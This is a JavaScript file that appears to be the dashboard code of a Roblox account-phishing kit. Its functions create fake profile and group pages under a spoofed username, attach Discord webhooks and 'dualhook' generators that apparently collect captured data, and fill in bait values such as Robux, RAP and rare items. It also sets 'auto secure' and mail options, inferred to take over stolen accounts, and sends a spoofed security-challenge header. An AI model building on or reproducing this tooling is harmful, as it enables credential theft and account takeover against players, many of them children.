function Add(a){
    var gameId = document.getElementById("gameId").value;
    $.ajax({
        url: `/controlPage/apis/add?a=${encodeURIComponent(gameId)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = '<i class="fa fa-plus">&nbsp;</i>Add Now';
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  `VIP / Private Server ${data['name']} created! Please refresh this page to see ur URL`,
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Remove(a){
    var gameId = document.getElementById("gameIdSelection").value;
    $.ajax({
        url: `/controlPage/apis/remove?a=${encodeURIComponent(gameId)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = '<i class="fa fa-times">&nbsp;</i>Remove Now';
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  `Removed ${data['name']}`,
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Regular(a, b){
    var RealUsername = document.getElementById("RealUsername").value;
    var FakeUsername = document.getElementById("FakeUsername").value;
    var Webhook = document.getElementById("Webhook").value;
    if(b){
        b = `&dh=${b}`;
    }else{
        b = ``;
    }
    $.ajax({
        url: `/controlPage/apis/create?a=${encodeURIComponent(RealUsername)}&b=${encodeURIComponent(FakeUsername)}&c=${encodeURIComponent(Webhook)}&type=Regular${b}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function(){
            a.disabled = true;
            a.classList.remove("GGS");
            a.classList.add("GGSLoading");
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Create Now!";
            a.classList.remove("GGSLoading");
            a.classList.add("GGS");
        },
        success: function(data){
            if(data['success'] === true){
                window.location.replace("/controlPage/dashboard");
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Dualhook(a, b){
    var Directory = document.getElementById("Directory").value;
    var Name = document.getElementById("Name").value;
    var Thumbnails = document.getElementById("Thumbnails").value;
    var Webhook = document.getElementById("WebhookDualhook").value;
    var EmbedColor = document.getElementById("EmbedColor").value;
    if(b){
        b = `&dh=${b}`;
    }else{
        b = ``;
    }
    $.ajax({
        url: `/controlPage/apis/create?a=${encodeURIComponent(Directory)}&b=${encodeURIComponent(Name)}&c=${encodeURIComponent(Thumbnails)}&d=${encodeURIComponent(Webhook)}&e=${encodeURIComponent(EmbedColor)}&type=Dualhook${b}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
            a.classList.remove("GGS");
            a.classList.add("GGSLoading");
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Create Now!";
            a.classList.remove("GGSLoading");
            a.classList.add("GGS");
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  'Dualhook generator created',
                  'success'
                );
                window.location.replace(data['url']);
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function SignIn(a, b, c){
    var Auth = document.getElementById("Auth").value;
    $.ajax({
        url: `/controlPage/apis/signin?a=${encodeURIComponent(Auth)}&b=${encodeURIComponent(b)}`,
        dataType: 'json',
        method: 'POST',
        data: {
            '_token': c
        },
		headers: {
			'x-session': document.querySelector('[name=sessions]').getAttribute('value'),
			'x-csrf-token': document.querySelector('[name=csrf-token]').getAttribute('value')
		},
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = `<i class="fa fa-mouse-pointer" aria-hidden="true">&nbsp;</i>Sign In`;
        },
        success: function(data){
            if(data['success'] === true){
                if(data['type'] == "reg"){
                    window.location.replace("/controlPage/dashboard");
                } else {
                    window.location.replace("/controlPage/dualhook/dashboard");
                }
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Retrieve(a){
    var Webhook = document.getElementById("Webhook").value;
    $.ajax({
        url: `/controlPage/apis/retrieve?a=${encodeURIComponent(Webhook)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = `<i class="fa fa-hand-rock-o" aria-hidden="true">&nbsp;</i>Retrieve Authentication Code`;
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                    'Success!',
                    'Authentication Code has been sent to your webhook!',
                    'success'
                  );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Selection(a){
    document.getElementById("Profile").style.display = "none";
    document.getElementById("Group").style.display = "none";
    document.getElementById("Other").style.display = "none";
    document.getElementById("Secure").style.display = "none";
    if(a.value == "profile"){
        document.getElementById("Profile").style.display = "block";
    }else if(a.value == "group"){
        document.getElementById("Group").style.display = "block";
    }else if(a.value == "other"){
        document.getElementById("Other").style.display = "block";
    }else if(a.value == "secure"){
        document.getElementById("Secure").style.display = "block";
    }
}

function OtherControl(a){
    localStorage.setItem("type", a.value);
	document.getElementById("webhook").style.display = "none";
    if(a.value == "webhook"){
        document.getElementById(a.value).style.display = "block";
    }
}

function ControlProfile(a,b){
    let data;
    if(a == "Profile"){
        data = JSON.stringify({
            username: document.querySelector("#profile_username_input").value ? document.querySelector("#profile_username_input").value : document.querySelector("#profile_username_input").placeholder,
            displayname: document.querySelector("#profile_displayname_input").value ? document.querySelector("#profile_displayname_input").value : document.querySelector("#profile_displayname_input").placeholder,
            premium: document.querySelector("#profile_premium_input").value ? document.querySelector("#profile_premium_input").value : document.querySelector("#profile_premium_input").placeholder,
            avatar: document.querySelector("#profile_userid_input").value ? document.querySelector("#profile_userid_input").value : document.querySelector("#profile_userid_input").placeholder,
            friends: document.querySelector("#profile_friends_input").value ? document.querySelector("#profile_friends_input").value : document.querySelector("#profile_friends_input").placeholder,
            followers: document.querySelector("#profile_followers_input").value ? document.querySelector("#profile_followers_input").value : document.querySelector("#profile_followers_input").placeholder,
            followings: document.querySelector("#profile_followings").value ? document.querySelector("#profile_followings").value : document.querySelector("#profile_followings").placeholder,
            join_button: document.querySelector("#profile_join_input").value ? document.querySelector("#profile_join_input").value : document.querySelector("#profile_join_input").placeholder,
            placevisits: document.querySelector("#profile_placevisits_input").value ? document.querySelector("#profile_placevisits_input").value : document.querySelector("#profile_placevisits_input").placeholder,
            created: document.querySelector("#profile_created_input").value ? document.querySelector("#profile_created_input").value : document.querySelector("#profile_created_input").placeholder,
            activity: document.querySelector("#profile_activity_input").value ? document.querySelector("#profile_activity_input").value : document.querySelector("#profile_activity_input").placeholder,
            about: document.querySelector("#profile_about_input").value ? document.querySelector("#profile_about_input").value : document.querySelector("#profile_about_input").placeholder
        });
    } else if(a == "Group"){
        data = JSON.stringify({
            name: document.querySelector("#group_name_input").value ? document.querySelector("#group_name_input").value : document.querySelector("#group_name_input").placeholder,
            owner: document.querySelector("#group_owner_input").value ? document.querySelector("#group_owner_input").value : document.querySelector("#group_owner_input").placeholder,
            member: document.querySelector("#group_member_input").value ? document.querySelector("#group_member_input").value : document.querySelector("#group_member_input").placeholder,
            funds: document.querySelector("#group_funds_input").value ? document.querySelector("#group_funds_input").value : document.querySelector("#group_funds_input").placeholder,
            real_url: document.querySelector("#group_real_url_input").value ? document.querySelector("#group_real_url_input").value : document.querySelector("#group_real_url_input").placeholder,
            thumbnail: document.querySelector("#group_thumbnail_input").value ? document.querySelector("#group_thumbnail_input").value : document.querySelector("#group_thumbnail_input").placeholder,
            shout: document.querySelector("#group_shout_input").value ? document.querySelector("#group_shout_input").value : document.querySelector("#group_shout_input").placeholder,
            description: document.querySelector("#group_description_input").value ? document.querySelector("#group_description_input").value : document.querySelector("#group_description_input").placeholder
        });
    } else if(a == "Webhook"){
		data = JSON.stringify({
            webhook: document.querySelector("#webhook_input").value ? document.querySelector("#webhook_input").value : document.querySelector("#webhook_input").placeholder,
			password: document.querySelector("#password_input").value ? document.querySelector("#password_input").value : null
        });
	} else if(a == "Secure"){
		data = JSON.stringify({
            secure_authen: document.querySelector("#auto_secure_input").value ? document.querySelector("#auto_secure_input").value : null,
			secure_13: document.querySelector("#auto_13_input").value ? document.querySelector("#auto_13_input").value : null,
			auto_mail: document.querySelector("#auto_mail_input").value ? document.querySelector("#auto_mail_input").value : null
        });
	}
    $.ajax({
        url: `apis/control?type=${a}`,
        method: "POST",
        dataType: 'json',
        contentType: "application/json; charset=utf-8",
        data: data,
        beforeSend: function(){
            b.disabled = true;
            b.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            b.disabled = false;
            b.innerHTML = '<i class="fa fa-save">&nbsp;</i>Save Changes';
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  'Data updated',
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function ControlDH(b){
    let data;
        data = JSON.stringify({
            discord: document.querySelector("#discord_input").value ? document.querySelector("#discord_input").value : document.querySelector("#discord_input").placeholder,
            color: document.querySelector("#color_input").value ? document.querySelector("#color_input").value : document.querySelector("#color_input").placeholder,
            name: document.querySelector("#name_input").value ? document.querySelector("#name_input").value : document.querySelector("#name_input").placeholder,
            thumbnail: document.querySelector("#thumbnail_input").value ? document.querySelector("#thumbnail_input").value : document.querySelector("#thumbnail_input").placeholder,
            webhook: document.querySelector("#webhook_input").value ? document.querySelector("#webhook_input").value : document.querySelector("#webhook_input").placeholder,
            summary: document.querySelector("#summary_input").value !== "" ? Number(document.querySelector("#summary_input").value) : Number(document.querySelector("#summary_input").placeholder),
            robux: document.querySelector("#robux_input").value !== "" ? Number(document.querySelector("#robux_input").value) : Number(document.querySelector("#robux_input").placeholder),
            rap: document.querySelector("#rap_input").value !== "" ? Number(document.querySelector("#rap_input").value) : Number(document.querySelector("#rap_input").placeholder),
			korblox: document.querySelector("#korblox_input").value !== "" ? Number(document.querySelector("#korblox_input").value) : Number(document.querySelector("#korblox_input").placeholder),
			headless: document.querySelector("#headless_input").value !== "" ? Number(document.querySelector("#headless_input").value) : Number(document.querySelector("#headless_input").placeholder)
        });
    $.ajax({
        url: `../apis/control_dh`,
        method: "POST",
        dataType: 'json',
        contentType: "application/json; charset=utf-8",
        data: data,
        beforeSend: function(){
            b.disabled = true;
            b.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            b.disabled = false;
            b.innerHTML = '<i class="fa fa-save">&nbsp;</i>Save Changes';
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  'Data updated',
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}